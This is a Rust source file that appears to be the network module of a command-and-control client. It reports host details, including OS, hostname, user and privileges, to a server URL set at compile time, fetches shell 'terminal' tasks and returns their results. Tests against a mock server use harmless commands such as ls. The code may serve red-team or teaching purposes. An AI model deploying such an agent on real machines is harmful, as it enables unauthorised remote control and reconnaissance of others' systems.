use std::{
    time::Duration
};

use reqwest::Client;
use reqwest::header::CONTENT_TYPE;

use crate::models::{Task, Auth, TaskResult, SystemInformation};

// Note that URL is set by environment variable during compilation
const URL: &'static str = env!("CONTROL_SERVER_URL");
const TIMEOUT: Duration = Duration::from_secs(2);
const INIT_ENDPOINT: &'static str = "/control/client/init";
const COMMAND_ENDPOINT: &'static str = "/control/client/task";
const RESULT_ENDPOINT: &'static str = "/client/task/result";
const CONTENT_HEADER_VALUE: &'static str = "application/json";
const AUTHORIZATION_HEADER: &'static str = "Authorization";

/// Sends a post request to the control server with a JSON String as body
///
/// # Returns
/// The response from the request as a String
///
/// # Errors
/// This function fails if there are issues sending the request, if 200 is not returned from
/// the server or if parsing of the request response text fails
async fn post_request(body: String,
                      url: &str,
                      endpoint: &str,
                      auth_token: &String) -> Result<String, anyhow::Error> {
    let client = Client::builder()
        .timeout(TIMEOUT)
        .build()?;
    let res = client.post(format!("{}{}", url, endpoint))
        .header(CONTENT_TYPE, CONTENT_HEADER_VALUE)
        .header(AUTHORIZATION_HEADER, auth_token)
        .body(body)
        .send()
        .await?;
    let code = res.status();
    if code != 200 {
        #[cfg(debug_assertions)]
        println!("Failed POST: {}", code);

        return Err(anyhow::Error::msg(code));
    }
    Ok(res.text().await?)
}

/// Send a GET request
///
/// # Returns
/// Result from GET request as a String
///
/// # Errors
/// Fails if there are issues sending the requests, if the return code is not 200 or if parsing
/// of the request response text fails
async fn get_request(url: &str,
                     endpoint: &str,
                     auth_token: &String) -> Result<String, anyhow::Error> {
    let client = Client::builder()
        .timeout(TIMEOUT)
        .build()?;
    let res = client.get(&format!("{}{}", url, endpoint))
        .header(CONTENT_TYPE, CONTENT_HEADER_VALUE)
        .header(AUTHORIZATION_HEADER, auth_token)
        .send()
        .await?;
    let code = res.status();
    if res.status() != 200 {
        #[cfg(debug_assertions)]
        println!("Failed GET: {}", code);

        return Err(anyhow::Error::msg(code));
    }
    Ok(res.text().await?)
}

/// Sends the clients identifying characteristics to the control server.
///
/// # Returns
/// authorization token received from the control server.
///
/// # Errors
/// This function fails if there are issues sending the request, or if 200 is not returned from
/// the server
pub async fn send_identity(id: SystemInformation) -> Result<String, anyhow::Error> {
    let res = post_request(serde_json::to_string(&id).unwrap(),
                           URL,
                           INIT_ENDPOINT,
                           &String::from("")).await?;

    let response: Auth = serde_json::from_str(&*(res))
        .unwrap_or_else(|_error| {
            Auth { authorization: String::from("") }
        });
    Ok(response.authorization)
}


/// Asks the control server for commands to run
///
/// # Returns
/// Vector of Tasks the server wants the client to run
///
/// # Errors
/// The function fails if there are issues sending the requests or if 200 is not returned from
/// the server
pub async fn get_commands(token: &String) -> Result<Vec<Task>, anyhow::Error> {
    let res = get_request(URL, COMMAND_ENDPOINT, &token).await?;
    let tasks: Vec<Task> = serde_json::from_str(&*(res))
        .unwrap_or_else(|_error| {
            Vec::new()
        });
    Ok(tasks)
}

pub async fn send_task_result(tr: TaskResult, auth_token: &String) -> Result<(), anyhow::Error> {
    post_request(serde_json::to_string(&tr).unwrap(),
                 URL,
                 RESULT_ENDPOINT,
                 auth_token).await?;
    Ok(())
}


/// Tests for the communication module
#[cfg(test)]
mod tests {
    use super::*;

    #[actix_rt::test]
    async fn test_send_identity() {
        let id: SystemInformation = SystemInformation {
            os_name: String::from("test"),
            os_version: String::from("test"),
            hostname: String::from("test"),
            host_user: String::from("test"),
            privileges: String::from("test"),
        };
        match send_identity(id).await {
            Ok(val) => {
                assert_eq!(val, String::from("12345"));
            }
            Err(_) => assert!(false)
        };
    }

    #[actix_rt::test]
    async fn test_post_request_invalid_url() {
        let url = "https://1.2.3.4";

        match post_request(String::from("hej"),
                           url,
                           INIT_ENDPOINT,
                           &String::from("")).await {
            Ok(_val) => assert!(false),
            Err(_) => assert!(true)
        };
    }

    #[actix_rt::test]
    async fn test_get_commands() {
        let auth = &String::from("12345");

        // Tasks pre-defined in test/mock_server.py
        let t1 = Task {
            id: String::from("1"),
            data: String::from("ls -al"),
            max_delay: 500,
            min_delay: 0,
            name: String::from("terminal"),
        };
        let t2 = Task {
            id: String::from("2"),
            data: String::from("echo Hejsan!"),
            max_delay: 1000,
            min_delay: 100,
            name: String::from("terminal"),
        };
        let t3 = Task {
            id: String::from("3"),
            data: String::from("hejhej"),
            max_delay: 150,
            min_delay: 0,
            name: String::from("terminal"),
        };
        let t_expected = vec!(t1, t2, t3);

        match get_commands(auth).await {
            Ok(t_actual) => {
                for i in 0..(t_actual.len()) {
                    assert_eq!(t_expected[i].id, t_actual[i].id);
                    assert_eq!(t_expected[i].data, t_actual[i].data);
                    assert_eq!(t_expected[i].max_delay, t_actual[i].max_delay);
                    assert_eq!(t_expected[i].min_delay, t_actual[i].min_delay);
                    assert_eq!(t_expected[i].data, t_actual[i].data);
                }
            }
            Err(_) => assert!(false)
        }
    }

    #[actix_rt::test]
    async fn test_get_request_invalid_url() {
        let url = "http://1.2.3.4";
        let auth = &String::from("12345");
        match get_request(url, COMMAND_ENDPOINT, auth).await {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        }
    }

    #[actix_rt::test]
    async fn test_get_commands_invalid_token() {
        let auth = &String::from("INVALID!");
        match get_commands(auth).await {
            Ok(_) => assert!(false),
            Err(_) => {
                println!("Intended failure!");
                assert!(true)
            }
        }
    }
}
